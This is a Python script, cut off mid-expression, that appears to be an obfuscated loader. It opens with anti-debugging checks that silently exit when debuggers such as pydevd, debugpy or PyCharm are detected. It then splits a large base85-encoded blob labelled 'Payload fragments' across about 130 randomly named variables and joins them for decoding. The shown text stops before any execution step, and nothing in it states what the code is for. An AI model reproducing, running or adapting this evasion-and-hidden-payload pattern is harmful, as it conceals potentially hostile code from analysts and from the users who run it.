#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_czIZowmNRJwtLk = '<V@l=4R9F7zjVTOma9o&V|WZKtu!7)Z@Nu}ntXCHg#t0=(m|E62_aGy_NHpN>&M!Imo{5`2xg|'
_cjRapS02E5y5BW = '$jSp5SAZSJW5qV-z_G&D6D%){+7*Q3l71PzFh)#_Q*b+iV<T&$T;a-(d*&$dK@=})3>>>V^`dt'
_cgqw3ISLBjoudf = 'Erda<IgZz>Q;91_3N!zgd=@T=m@Setw(pbv&wb@iTIvj4PjqbIMnYZcd9Uq`j8G_fdfZcL%yNT'
_cluVHe2O7fkisI = 'olL3e&vBOiYo~A#Imlk0+S4xgIA*-}v4?dT%P*A+_VUBrAtho*rw9?gncbv4WY}WuZq(du1#kh'
_cvM3BmDnmViZbM = '2`8QD_$^47_NfB9rg_D;HU+V6aLl6av)`PyFKB*5fNoRZR4vmPu<Zg;5kM2+x`7}_)K=H9F)dp'
_ce0hhtfGYbFjFA = 'NIk$wKin8{ngK}lGMqk|9<hZPky!)Un!Wf5M!c*|<+sNrLpN{_WP<%{8s&(6$+by5R!Nmbu+%8'
_cpWbuiqA3M9L0_ = 'SVabUbm?cG*sI5DL*3L#j5tMN&Kb*Byfg9skz##6^0g4X)SoMpk+D;9g4u7q}VK`+n&ys}`#<K'
_cwFXPLBmbh0Rdh = 'MkYh6LVYhR^1y}l`em3V?R!#tq-V(0}6Q7cD?`};n?z}uZ0yw37MU}u~anYpB&Rc*&=q<p|gI)'
_cxBrYJlKueRc48 = 'yYMqAL5B@@za_MmduOI&~}0L@~HwHC&?5`GEZC<NCs<AEQ)ZTUNc<2crXhZ7#^SlGMhs?_psc+'
_ciMtFXCyaeE6El = 'fB3J@&G3Vn#CElcQs9Q_=?Z*YlW#Z1ybk(%svJ40~xq(nN32k<{J?9oxARV9^13xfbFa-<SLMl'
_cvB70MgbLedIzJ = 'E0{uR#5cfG=w==gogEEu1!npNh(HDrGlax2bZx%}=bPQK5#2|!(tbfNXK|FH;~R`hu!2A{TV(a'
_cvcQn45XcY_ddo = '~=r_H+48wswK64?K1Vzvka*aekf9jsTyJm9Lw`#(8vT3pq;e1!~gid9XtItMmS*QIjK!vSytZG'
_cpTweR0OvbEqMe = 'sVo<0`3OTS79A)}vp(IQEmo{$3J7mn<KoP+C;dlZv(QX(<mv2!g)`Q_-RuBlHM{^_NMEQn68i>'
_cj3f4Dkl6CcZE7 = 'p)>eDVAZWa{J_VSRkHFmvFH12>^npwD51rt{%HE9slM(VJ{n2@}lM7+(sXb&{?%XegjUxCjb7q'
_ceBmFewP_WKFTc = '1zHu@ubK#W%d{gOx*>ltaQj+i37wvkOu1M-}<lW=d6LpgSNCOA%lj*Ba<FCXTVa+3OByeKMnz>'
_cnaZvDRTgAImMZ = '?`Iue`ro9P=lF4k86^w8k*kh~Lu5d)b;?bDgY<(<cqEs}RJb5y^02EmW5TY@?hMN(A5+-iCctx'
_cx715UMxbCtwis = 'Afft6<a{1j;|NNm;w=ngCeLV}e@VZz;MEm^t9@A4a(ee6OAm)=<)s7?QiHxoFf(;clwbc2GfR-'
_csemYjznhBLLMf = 'H(e*E|3p5nA!9)8rRa!-E!|Mi-<pP-avE#0d}AyM09kCXbhcn*FWZ0GlRHjE4Dbc2Ywt7Q)oEs'
_cfvNhHq0xnqOfU = '4)*LBZqurIYbUjUL%vhJesC09sTYF7d4uhH8$l&Ql5*pm)R-(N0R^V|d?UldH8}w@?DGCe7H=j'
_cyvqIGXswc05Ah = 'm`L<dO%0RO9p~YJ4ww52JN2hzP{ZL|Ge9`#<Y5GOtu6y;HSl|S1Z@GAB6dY&^8n*i)h1X>nOF^'
_cbpDRSUwRoOgCQ = 'bQ{N_qlXEdo;(Y}=Kv^oG&vT>q7l114i)$X_~7M6w)+Y>Qkif>{-S(#I$Y9ysbuG-vwQYsjsB;'
_cuxQK796BXp03x = '>g`}hS)71UjOJ0Dpc2nQV6L{*dQ5PJSRwbtD%LQS@P_WwB9A(4ZElgV}bq%_ASRk`SM4rGn38^'
_cbB1q3FBnyMwvx = 'JfrF@mXPX{6*^pR7=nM9cOhcH)Eb3O(b=mc7}5G#*LUyxp3ZftX=drGyTISLfr(AneQRTD(7;)'
_csxoPnxIiC99Gr = 'G1)KNYuy+0@(^Q??^w&>}A9qb0(~E*Df|k=eEM(ed0x#-DX;^mzA9M;q;b{%7P@yv6_|DCl}SZ'
_ciQmDTjsFBsmhd = 'OTJPwM0Af4y<0xp34Y#$jpy<-esP;#vDmRdb-58*RRuY#3bX^l<RFP?m^>{ME}HX`&3)<QF?;p'
_cjg4lu0ApDhuH2 = 'uZtlZm$Sw%XwX+rfMM;@p@gMnU(9eubT{beuCDYF)OWif=+}A|1sE|Nle-?eXb6y55UU!%qB;K'
_ciblRlf9qaeD86 = '$LTYcaTvwTiW9mKbNl5CKP|O8RAYNw`TA~@ne<^*&OT1<!oV))+)2nr#&U<Vh^)lX-$i&ZWAc7'
_ck7SjhkNg8bVHj = 'tfj^9ndv%90Vxjj41-`6yg2A>j<>duzFXz~52uNP7eoKKMPmzC0QU?-4GsWA#;5|EBDiy;PIhV'
_c_lbltqH38o0US = 'zJ+*nd~dH}(W^I2ob(Tn!9VdN!J7(;?{A?(f|_>g*{2Z0gEfd6y6X%x#A(=$UNc5ksd0kY3!}y'
_cvbcOZecL4GA2d = 'fwfW@w~G$dI|#>^m#M7Qt{E0obsfHeU%~yrW-YNV6|Xib7gVJvE|AlV3Q@6Xl<+-!WTTdfO|c6'
_ci4jC5YT6d2NMv = 'GICTGFx4Q?SnW6jr<%OKBT#o4Z%Km;irB~-)q4TT&|7^821b)K@c|RaxTEQa@Tax+Q;z-SX<x{'
_ccoJUSEqS8bIuD = '&z)U>BK$&F)lJF~KZtgKssOm0d#)HoVv-Y5Xu4R)Pwlnv<7Oy&+R-4C?r&P5<EkEHSL9uUBE99'
_cuk31e3dSoJfSp = 'OzRwDQQ^1hsqNI14wQyQM_RCBR(jqa|iSw#A+olafo4Dh?=6g|0%Ndcd#$oLI^mI3N`76oXo(8'
_cgNS02itJ6M25H = 'ZUP_QtWwE8ujg!%wooI5EcH%iZaiU&nApR%So<GE}?uA#+x3)EYC=*rt9CRLl)QMKYTX@F%BMV'
_cnvfJeGJE9X4NN = '0T3z#<GMP!~be{tFoX6720@p#vys-n^{+n@VNtm5nh>Y*vpJghcW&C+zMI(6Uh0bdfDIpQ_{S~'
_cqJTdBjeIQWDUW = 'k+LV|MZKjiNt=b25|EOiHOa13QxRj;;VgB&?kt~Ehi=Jd%k0UhO@;hkN|_z3obgUh5~D7wddW<'
_cxHDMeWEJcdPRM = '8c)G^ipv&l5`6?GuX;fXdzmWW`y8USoN#zRy+HJHJ_=PffD+gN>2OcSa{eqCO!aCe10gG62{-F'
_cqmElr7KYFOsMc = '>@!|>jZ!T3-o<v1I~xd|!~%eJ}hWPLaV5)F=~jWw=*KZT?SbO_cB2Ti#F$wAQb^)_v`G39N@tg'
_cf08EfLxfhAzAj = '(Ygd>|kfa1(-YwJsQvV6`lM#+7-R0x+K4e129vq?6p@>VrXJ4_&d#r16F*?QDss#G`ZsTavo`E'
_czb_jX7ZdkZTZJ = 'FA)WzlAS?qAE<wHNEzZbR9=GN<{ez5Pp?hbR|Eq7VkAE;0+B_W-p1)cz?`DG1e(}8Id3MEpD1E'
_cyNDoJonVotkLH = 'sJb9UX><&lfzGe8zGK40e#{3HChV%39z)TIsb|h-D-~`1H@4{@SBkB_BdIcKgCEs<L}G@!8BlC'
_cyUx96zWap_fVH = 'Bc5%{)f%t#kgIS%RG+z#iTqc}|?eHC+c+C}L)Rt*etLo2xXk^QpMBkQ6DyVx^B5zT5?e>m}l_z'
_cdCaj7DkwkA688 = 'c?DwOsQNw63e`1vdinC@XjCf!jSXLp8gVx{P$>qV5W@c(TW_~Z@TMCj=tzK;H4@*ivr=4E+;XL'
_ckyg5S3f30vZQy = 'iZSQ|G?MCS6;DxA+A26zcj=akgSIG)Euk2L^tH7g>0rgIjs<(p>y@EUB^N7obr6FQ?{D!X~l{8'
_ct6WhIXCv4GpZt = 'M8YaDi|M@b1vv@NAJNR@v0@i;{+w)Wm`A)<;8&(NBBqu2CUsZR?mhpP(k#1%%FE}(dQ)GMmzA)'
_cg2mEundmbqae0 = '+YJWpiefYwxaGGz&_Xv-_Q%d?p4px{?Y9w4RtQm8Hnn2aWg9a<biv+2VGpt?$0SZtmp?+%qA#I'
_cea_StCVJSpK72 = 'fKc+w6k^ZEO`8Y<_D-8So4J}Mo!$kJq@&tVnPQ!+PH(Q5t@SCSHGCz^&ED%jzvLQ-zIiOEgeQV'
_cuLxBnoG6dtwbe = 'zG3edu~0s`4{Dik1vUto9IFf)vs!rYq?6)szf;=SwV(PB{#eXAOzy*)J3-E(NZQ58DNlwDJN*K'
_c_2ToghjJrALdM = 'F(-gl-AB_Kh$F{9CQ}ZR-s~cWue_*Uqr=nmd%r$Eh9{VoRh-lU>=14Z1u*_1Nl?Nqhu)O4I<$T'
_cf_9p3AXeSJbq1 = '!7x2ouuqHqn+zuDud$6<y^1}0!$PMe&YpU%bCQ$rSs8iX&TUdS4m23c>p&hd+TVqmobUoeTjDJ'
_cjJdoDxbi21eF0 = 'Ec)nYgCV#Mf_ZU#-b%<qon+F;b=euIxZ>HyVD_B6HSQU}wJoeQNs~;MFs{X_u=ktOE6wzNxKgb'
_cvn1wgVFLoZss5 = '^n50=oNADcjBw|RuV%$#@_W**Iehvg6Fuzz$G}h4gDku0rs^=-f3{f=`zsGIU2QC2O&!8ypIEw'
_cni4Cd0legNtdy = 'cpz~naNX+-~MP0lC&KRSpv1Xdkb|D6;T(Y@_^`zq3XlAHgFsGyD4-%T?1BFNae^Q(O#7gfWTY{'
_cctTGY4jy33ooD = '$OR<h}`^yDGIwT=0&aS=gYQSwG$>Sq22+YDdXbbI;I-d;r4rM6C`ZKiLtUEZ!k|2S!M?<5m2Qh'
_csVZdMZmVY5XMw = 'PruQD8geyMh!mz71?3Heq9V}X=7G{d)RfH?M00^$N;J`SXDZ~`hor!J~K=BO`YBOl_wu-^!XdT'
_chbzWoBNxf9ZCe = 'vUgu@0=7k!37uMKQ#;j7?S<$m=Ath3yb1R=<V0itDfj4<@zFzk6DyYaeq{ez4+I`FldYs_Lkd;'
_cx8wbkBKOBYVAB = 'L3_pmE%SK)DzD%>w&1Kk5!_1U-b&Z~7P^jZ>oE~HY?T;1pq(h9g8L>L!Qo)S^I1N$S)o{j->J1'
_cxwz0K6EOkDhKc = '}{`<WG8su7aXc%sR$6ta7vJS5&h{*sRAw9R6JZ)wGXwgcv#3&@eAqkDEoCtfvj(P{7Z5G~{&GN'
_cyedD6Vbq5l1MJ = 'y(mNL9~CG#IC`SV`;eD6pmBOz8j<uVyW8Qn8%dmB&geCg>bazwHugjC2xLHKwf3d^H0`%MjaNM'
_cygBrx6_ty6TZu = 'zruq&ZqOlBX0~r$a3@^4+N|{o~_AN+Yh8=GMWg<kG_?;CJQldxA=8vds|kPWw7^(y=aCcIvwC-'
_crKwVXt2XNNLYa = '?uUbALqLco`_&9;oWJ#@+;#^r*)Hzkb?)AX+^ckz?m5PND)=B1JVF*!cqq$tZyKn}5he;xe~ar'
_ctikW7h0zkoaEc = '1K9`j})N8YUOss&8OOTQE{AZi|xat#IbyNnk#{9|&KOr(2CLHt;o#9?l{8@z~zH%8}DU6YgqyB'
_clGx3vcvY_JJdC = 'nF6+(dko}h>iLSZhuhqlbdx=?UsdcGpsTbES_i9i)}&#G26r3t+4JquBdS!n2CC;LMxJR~-;-u'
_cctGBsvkDAgdub = 'BRxe5{p+`!E9q)|?wXI(+{1<qUQ@2e@kT;b8&HdmJ52q$#u7+!eM5B6v`@f=Ni}+Uv5L4cTQ8H'
_cbjYUiGSVnluCI = 'YM*s)8ogVvAJ2MNYsh=J>IPcNP(s3$(uH>HqWx{!B8dz!m-UyG<ECZ=J(r%Orw4B^6%gyge3xi'
_cg4DxrUpyQ7yLX = '7e!piM+2!<UzifT0b~Pv*uS)=p&7nA)iX2Vk;(MBq(sdMlS`gE!5|mvsi+Py2}+}{#U6@MwRYz'
_cx18IoX1U3M5iz = 'W#cyey<FbLzyrd}CK@ejKi3YQMJqIJyW_e9hV8<&QX%xpNVd(YCSjk;euek0_HA~^WaO<N$<5a'
_cvxWjD1F7VPXRV = 'h@nE8CjGFvK3e?z1$0`1BwsB`q?=|B|J&d7Kg^Pi1AAZ4W+M462mxCyI-5eb@9ogf-}9bMqxFa'
_ceOLoeBQf2NVmP = 'YksOJ(Gc;?87Mf63LWLsGOD^5L=dcLg{-MdSZ+ExN?Pv3aOV<E|`s-`!goYOGkB6Y+I5ErM!Y1'
_cx53xqEazobTDD = 'Bv;Q(l+`+v)a%i%dFm2?_t*iixRC+?h1raiC4V%T1@x)G0H=dhiF5RiF%(gwolA;!D*2hPgksi'
_cb4WWXuHiKhgdk = '1C1{(l`fYed^e~Q)7LEFto$!)DeO=k*#*GpKJ{f2i%&IAyc_vJ;_;^6eaJnGzvlydoNNOSA#fl'
_cg6V1nGL4vWXD2 = '^e)&`oP@uBl>&1&IZ8tsi?U?hPqPqiw8<OXm-;i=HzQ=I~@~uyTpA>}{Znn7`00Dt9Chox>dGc'
_cz3Vr_QTjlXEYp = 'X|VBi2pw(cmJfxL!wzZ-(kgLqRJF$2U>f{b@Zd<zqTXFntw+E7zH3=LepDQ_R(K`b(<wED<Co-'
_cf5R6qIfL3PeVP = 'cB9KI$ne$;!b_Ka~RovTq0nAS}yyA=VasUPA%+b=1H6ZBNP-4ej@lD0EPd2Ae)7I_s0beL4Z#7'
_ch6S04CHm9mZee = 'b6NcHKLi~MxTc4gNmvbrzOCv>vSu$H?_$o5{3e^wO3PoAbW9+z5`-6i4Ue_uamZdj<K$+WqBZ6'
_ceVvn98QbITJWA = '?}b4s@_*fF+ROR+?MvqVC@>_?x}q06)>9cB0+3m(fM0!K+{_1sEx81L=bdb4HA6haw-$19Nw~*'
_ci0li7INZokmFu = 'x)nUcc!h21xM8e1*xF-@W5_cy#9tqCmv9P&yWJM;F7?)XA7`D8e0Qy;h5YoohsVuV^b$Px)dxu'
_cfK16Hjj4VMPkX = 'AL(co3-S$&qPUmvm&T~=WNv4hMMH*-N&LOZdNp}}=~>#%)qzvw!3+bXG?5duNn*`nV74t%`jGy'
_cjQOZaC5zbMDo4 = '>sZcqbts+_ZgZ1sIXzI%A);wXjpe$l`ZxxAHdxprr?QYd_-NvG2AiYwa9D0j#J7CR{sk<5x3Vo'
_clUHebwRpmFhQ4 = 'sCypY2sE|;yLLb^=ufU*as$}*mc*b!3AYigXGL<SuWfii%3#Q*;+5eEGsCnIn{nkcf0V!AVdpl'
_cm8M7Om3_mBrnR = '^X{ABR;<(=;m{RNQPs^yFT=c;Ez`VYKiS|>ML!_!zXX@+B;@u-kE$MiD|QFEep9O-&xG10ohw$'
_cb1PW8j6rJBpKg = 'HHS<tebH$_bN+2jbUeljLe$L=lw&pSfrEzuAE&i!{jhbb)qKq%T=Q_Qo04EqUezz`5{jAPtSu{'
_cf2JaXwtUN1tib = 'GxFdPj%xtcKNYc3qM=z6BD(EQv*6|$qvQy^h=D{{+j<)!bi>sY>(OQ5M_OdWs8CW?>N75%}R$%'
_ckV6MpSGeURmOB = 'PyXw~Qd?7y(M`Cf@(#m`;UWB}xd&wqxYQQ8S7b6Q!hEO$$#Y8A0Pc^uu;pgjK&nRI|fHk7PrHY'
_cgOOedPVadeYA3 = 'Gsu9t+aHl<_n^|jRt=&cM)zmecD-UytwJ(wi%|KsWH0cG6yA)pl7~zDR^~I3o|d;cwzIq)t$d~'
_czyfIh0chJvsZk = 'WjIPOI`#BjPnbz)TAXa1u=VzQKWhU1g_!PwDJS-IvQTw7x(%Pman=Z0)dat4H<wYZnE02y^)j)'
_cvUzRi8y_eUGXb = 'C{lYfwG%l;rH3{-xM;Xi@u#jV@$~M{kLCh0Uvl<lr^|j(t2LRq^&nh|x*L`JU>a+nk7#)bT12}'
_ctxw5s6ssXL5uw = 'HnadA;IY~2h<xTQOra^x?bbwgPnobTrnDd|77sD3c0269%L-Vmj=TcJ!sR>r}%5ZHX^F7IPSy4'
_cn3bFM6EBL8bfY = ';*Dj$4zc6IIJ+#pM<yUhXXHrRA(Q{e@N}|GigLQ-R3A>FWpL&oTBPf0;2DB3^&%gG~cmo*G=Xz'
_ctvAxomdmiD9jQ = 'oDk4oHGI<*f?=uQAGjCKoL=N>^gyj=rNeqtHK=-Fs9Wqy5DR?sZ)hmqLsD#%;DLjv~S<xO%8p+'
_cz57tSN1ksb7lX = '_oU2)MfMS#8>t?9HGc=XtYvf+e*cl$d?UYw?3fj4W?>A7Krpg!_y>KhVg6i`d)?XNdcyz;XFIF'
_cwmJtFN1pnMhDk = 'rOjNZO>0(%@4sK4C)S~R-av&Oo$@~Oiz+j3GP=50{?c7?OzHYGR+7EL1q`ZDdE_L{R)uWq$E4B'
_cdMBsMqpomdIbU = ')sZ5f>s6219u=H_S!?JBr`Q*XEsEj8`9r@;G<pq;_a%5&RYjcT@VTL#^N9A1%w%9((eiS5Z_FA'
_copL7TptTBmMFI = ';ct(!U;~d$CbyF}s?}_0n7s0cPC}0Gvl~a>iq52cfrWP38+fZG5&AGV*#~w$~b4%!OR#Z-`DzE'
_cm8wzaCWwJEUuS = '@f}ow^~{m%biutM8IoOGSb;(6-i-JH=5yyKo1?Z5aZbK>5j196QAuw$QbH1Uu=~gCqT<S{v*ow'
_cjz8NLIPg0KRUH = '(;{WMQ-5j?+A$|uuIlJ~8($KMHhU>n&a*;VeaQkZKcGyBzG1|Cq2t}t(YYSVQVs4c(E{D<mWUi'
_ct3qAnNOmTsOLS = '$QrHgTh=2W<-W`=Noyb@ELB0AW;%y06+(!-rOK=1`m)n+$>qdE?s<!vmkdzZy(N2pYV3mt@a^q'
_caZPq7YL2vdTfW = '=8dh+MKHjqWXPb=49ws=m6Ozy=FGd|==(V_YwxLeUUSHvrgWaLOdMik{ykJ5ySLMf>h3E8R?0j'
_catlRgUYdkLS7G = 'Y~@A6{6jAF3i7>^LA5JfBZ@nBW8tffJ)+W%)|E7T=8G0baaHyXVM0Qc=@wCE9DRuE9BtbqC{`t'
_cl1vfZTBlH8z1W = 'ziL$P?+}Z(PmCqOQk{fb4b4CEnc=iE%BztQ{6v#vmiH(`bCpqKO0FlGQjO3n3ngE;O-WgsZxth'
_cadsJnOuL3AB1E = '5o~>@8z;64M)uNs9k&}>*K6|H(}G=w3LF<Xu1^+ZHVZI(GXOy&YrfUb10+)?AAs}M1Ut!MuKcx'
_clbAW7vvOMe55M = 'V*3mVa7?!})hbz_YpAD#4$*;NeJ7mzJof`~TW}1Q)_>?|C4f~0r!r47_AtJm<3rfNs32u%k{aY'
_clYCdVe4CkzIqz = 'bzg=DN3*Gpjo`7-^<eISTi)D)9RorAFCFn5iQs(-|aUngGgBB1$FmLuq}HY<A3O#TiFyebuu^z'
_crmt4mwue9Mhng = '#z+P$G8^3=~4{wHqC3($g%2pnL4sF$g~=w`CWb30+2nYC7AHbWQn#6`Au0%YEXlWj(*$EHLO$T'
_cbWFP61AHBZY0B = 'lI1-lOD%zI>tsUH6_U~Fybl!7iM~*!;go>C9vYQzz3NZTl|hc3lCB7l^^>&aC&ix7X2{OJ93}2'
_cb3Fc8c8FEQCOR = 'aeUMXZ(*!x6Afz|(KPA3dGh+Wq<&pg58n1-WMW!05ES;g_8iNuHlW57L1YFtsaE?n0koEb>D<5'
_cdQxIOUwTS8HYc = 'P&LM!<!MlsksMq@u_=+xRDP5@fVo_-d8wEh@r8}NoX4(=_*Jx`5ry({KWz5&A%QN5#QC>}KzGt'
_cd3m2hfmiFdvnt = 'SVP#Db7Qxcz4TunkLe-&hxkEL0F<Mr2(&{4HL+)y|wBIDkU<&v@R^*LAYZ~rYtg<jkRS#hlThC'
_ceZn6p8iiU6FK_ = 'I4!yIbIgqGM4#YVQn8?B|+xH+de4)8w?v%Y-@OMl#5@|A%KF#)%WjP7z@fw9{tnwszs4m9>Vg|'
_clbELN0iusj8yY = 'H^!Lo^p>wn>!0{&dd4p3Z!V|O!|Xr%Rlrnre-a*o(Y0$p9gGZRU44IqxCEufJ`s}cwAlLxP@us'
_caAEGphLxFH0Fr = '`0Ua@JZM`G$>a&AIF(G;<jxDA7fdDTFrH=;h6RmaudPaW?BTwlMmwT)6?-76LryPCMetTT+wJT'
_ceOTcy8flepkXl = 'ljvFA|7znhf*nc?OqTV7<UA>{$A}r86?BY8VCXWamX?V&1e?+|h;rYELuUF(LJ`QjOpn=MwM18'
_cmUt1YQPtHE2xu = 'KYJ(L!G`%h0%qg3PoBMl`gZzS<8c9nzJ9Mi?8cC9cD;9HFgJbTu0@UWGqnV|Xy(g8bIY-<7x?G'
_cdDXH0Si_HHfYQ = '=FtnQ}m_+@H9=;a*Df5gGuvGmrs8IZeNs{l9CBl}T7ha5@KHO^f0?oVX>s(5g({@W_3|Lmgw-6'
_cwKYeFzSXE0jTQ = 'u10N1YLeisS$}oWVZNw@&YenOO=BhdDrqHS)DrcJuFeI#-23@nbIKDRIxL&>Ec_oV8S#T$5)H('
_ckgXOA8GX64BRf = '-lO^l+O<B0B)D$)_h6k2v%pA<JYhGn>gqk@V}lrwvy~gk4wl-1h-hxjxymp`%qzfNO^fQi9JnR'
_ctqa_UE7HgLrcw = '9^Xgq*(59V8cZ(<HMex5)16L|c;M5XL#7F8d0`@EhUzII%o6JEsnRUN87-Ta1CyB!-)lHl*jCz'
_cwLS8RIueBhdEU = '0^y3I}y$3?xm-tTkVj^afR|BKk++=0e0=VqOnDuQ?9B9V1RAusw-tokPerGj8jjZRoujh?snoi'
_cvQRdWuk8WipHp = 'WBV^=5+_>H}cg7Fp+brn|4s1V?@>=n;ifq{Dv^ZPpc{oa*AR*=j!WIhrUwGj{siyUyl{@tckFy'
_cd6BZ2kTHS18Pc = '{Th5IR!*5_@~uNW?yz>NNG|e`gA!$Ues^a7!TE|v#H;i%=5NAcVqJU;QUXp)fScHB!K8gorX0@'
_czAZoNn10rIKOn = 'mnN@nVYVwtGz)(1q?vLRtSbIbNyse-@47X}MD|7yi)J?tOIZo;d)-_1!}&aH-@o{_CYE(f46oa'
_czIufjYQM0x6f4 = 'w2GM!t#GYJoTK2CqQh~-Jb@u4;8v{3KYdL$q8eeg9hN8_kBcydO@f79$mWKQ!<48B21!@czM?+'
_clBC0kJFqZS7DS = '9qYV(65NGQQZtbP#ABhhl46KZIc4a4oj@SbVRt`AxTcY#3q%iJ)jqy)$|AnB)e#j$?ExjdRg<*'
_cry62t9YNw8frj = '}|ZUXK{Z)Xgn(5(d_=w%o$`6KSo*8{hK!;#!-Be6@+BsCbDTzM=U8OXNj|;rw_tX#+2CjA!xiH'
_cd85d0YRo1FRtP = '&sHiXjtNt8DT2`0gLic)@!2F#4#Qsghv7Pgd@NOBKHq3!=5x;T10`<>9U1%u<X(?ZlySl8x=V&'
_cfXtVoamJLFmD4 = '@9N}ke`*9gz}({(t-BAdH1YPiW<&#SUB=iMQ}`vT>1Vyeq;#Ukju|nM2E?u3<8vzYg~+BiTedN'
_cojw2wVwvPwAsx = 'N;?C@uk#Qiqx-`Lx^<heq&9knuh!kN$8oh_dA;4gEzM<{o2avT$VmGh6LbZ`Rv4w8)x))h%9Sa'
_csYlo9IjafSXin = 'j=7n8?>{idb$ap5*%_%`G$JE#Atvtv9N|D{ze=Q09TgB!e#Z54TbX&!`@rODj9_;)}$zHE52%V'
_cayVFhRpbr4xLS = '-H7>`&v<BTdDPZ`<VY?sauIk5e88b=@N_orzn*Gjp87>?M(AK77aZeo=$G69RVd?)A2LMK*MNv'
_cshld5XLdNmEqF = '`3`idVkp>R6M5XD}|T3@_hHqwpAOk2#DVTnyDiD+E3ZwNXV(8F8ae!{gU!CdpSk;-}QR9L!1C{'
_cf6OCAv1oNY0ju = 'Ifn%Q^H$W?Z~0=&GC{_Hxh+!J<O$3fiCfLfg<^QjcL@cw6(DYg2^ep=tz=H{S2HY@^{>xbL0>d'
_cnoZQZxnYFyRn3 = ')qa0it9Cne`!>JG&6pC)q4t(hfhvi{*QZ-}RB;0uNWd*zQ8318%;x{oCxKsF6$`$Z<o>0Pg@y('
_crylf5vU0TT8ol = 'OYl8`Oi$Xy@1ZEslRTa-Yha&b`6BWjc&m^0B+t;^0^QEQ4*|2ttZ!&Tx>V;SUJ=*J=2A{{ZZQk'
_cgKvF5AJU7qTd4 = 'lIA8}$VssZs'

_pycSAs05DZnYKE = __import__('base64').b85decode(_czIZowmNRJwtLk + _cjRapS02E5y5BW + _cgqw3ISLBjoudf + _cluVHe2O7fkisI + _cvM3BmDnmViZbM + _ce0hhtfGYbFjFA + _cpWbuiqA3M9L0_ + _cwFXPLBmbh0Rdh + _cxBrYJlKueRc48 + _ciMtFXCyaeE6El + _cvB70MgbLedIzJ + _cvcQn45XcY_ddo + _cpTweR0OvbEqMe + _cj3f4Dkl6CcZE7 + _ceBmFewP_WKFTc + _cnaZvDRTgAImMZ + _cx715UMxbCtwis + _csemYjznhBLLMf + _cfvNhHq0xnqOfU + _cyvqIGXswc05Ah + _cbpDRSUwRoOgCQ + _cuxQK796BXp03x + _cbB1q3FBnyMwvx + _csxoPnxIiC99Gr + _ciQmDTjsFBsmhd + _cjg4lu0ApDhuH2 + _ciblRlf9qaeD86 + _ck7SjhkNg8bVHj + _c_lbltqH38o0US + _cvbcOZecL4GA2d + _ci4jC5YT6d2NMv + _ccoJUSEqS8bIuD + _cuk31e3dSoJfSp + _cgNS02itJ6M25H + _cnvfJeGJE9X4NN + _cqJTdBjeIQWDUW + _cxHDMeWEJcdPRM + _cqmElr7KYFOsMc + _cf08EfLxfhAzAj + _czb_jX7ZdkZTZJ + _cyNDoJonVotkLH + _cyUx96zWap_fVH + _cdCaj7DkwkA688 + _ckyg5S3f30vZQy + _ct6WhIXCv4GpZt + _cg2mEundmbqae0 + _cea_StCVJSpK72 + _cuLxBnoG6dtwbe + _c_2ToghjJrALdM + _cf_9p3AXeSJbq1 + _cjJdoDxbi21eF0 + _cvn1wgVFLoZss5 + _cni4Cd0legNtdy + _cctTGY4jy33ooD + _csVZdMZmVY5XMw + _chbzWoBNxf9ZCe + _cx8wbkBKOBYVAB + _cxwz0K6EOkDhKc + _cyedD6Vbq5l1MJ + _cygBrx6_ty6TZu + _crKwVXt2XNNLYa + _ctikW7h0zkoaEc + _clGx3vcvY_JJdC + _cctGBsvkDAgdub + _cbjYUiGSVnluCI + _cg4DxrUpyQ7yLX + _cx18IoX1U3M5iz + _cvxWjD1F7VPXRV + _ceOLoeBQf2NVmP + _cx53xqEazobTDD + _cb4WWXuHiKhgdk + _cg6V1nGL4vWXD2 + _cz3Vr_QTjlXEYp + _cf5R6qIfL3PeVP + _ch6S04CHm9mZee + _ceVvn98QbITJWA + _ci0li7INZokmFu + _cfK16Hjj4VMPkX + _cjQOZaC5zbMDo4 + _clUHebwRpmFhQ4 + _cm8M7Om3_mBrnR + _cb1PW8j6rJBpKg + _cf2JaXwtUN1tib + _ckV6MpSGeURmOB + _cgOOedPVadeYA3 + _czyfIh0chJvsZk + _cvUzRi8y_eUGXb + _ctxw5s6ssXL5uw + _cn3bFM6EBL8bfY + _ctvAxomdmiD9jQ + _cz57tSN1ksb7lX + _cwmJtFN1pnMhDk + _cdMBsMqpomdIbU + _copL7TptTBmMFI + _cm8wzaCWwJEUuS + _cjz8NLIPg0KRUH + _ct3qAnNOmTsOLS + _caZPq7YL2vdTfW + _catlRgUYdkLS7G + _cl1vfZTBlH8z1W + _cadsJnOuL3AB1E + _clbAW7vvOMe55M + _clYCdVe4CkzIqz + _crmt4mwue9Mhng + _cbWFP61AHBZY0B + _cb3Fc8c8FEQCOR + _cdQxIOUwTS8HYc + _cd3m2hfmiFdvnt + _ceZn6p8iiU6FK_ + _clbELN0iusj8yY + _caAEGphLxFH0Fr + _ceOTcy8flepkXl + _cmUt1YQPtHE2xu + _cdDXH0Si_HHfYQ + _cwKYeFzSXE0jTQ + _ckgXOA8GX64BRf + _ctqa_UE7HgLrcw + _cwLS8RIueBhdEU + _cvQRdWuk8WipHp + _cd6BZ2kTHS18Pc + _czAZoNn10rIKOn + _czIufjYQM0x6f4 + _clBC0kJFqZS7DS + _cry62t9YNw8frj + _cd85d0YRo1FRtP + _cfXtVoamJLFmD4 + _cojw2wVwvPwAsx + _csYlo9IjafSXin + _cayVFhRpbr4xLS + _cshld5XLdNmEqF + _cf6OCAv1oNY0ju + _cnoZQZxnYFyRn3 + _crylf5vU0TT8ol + 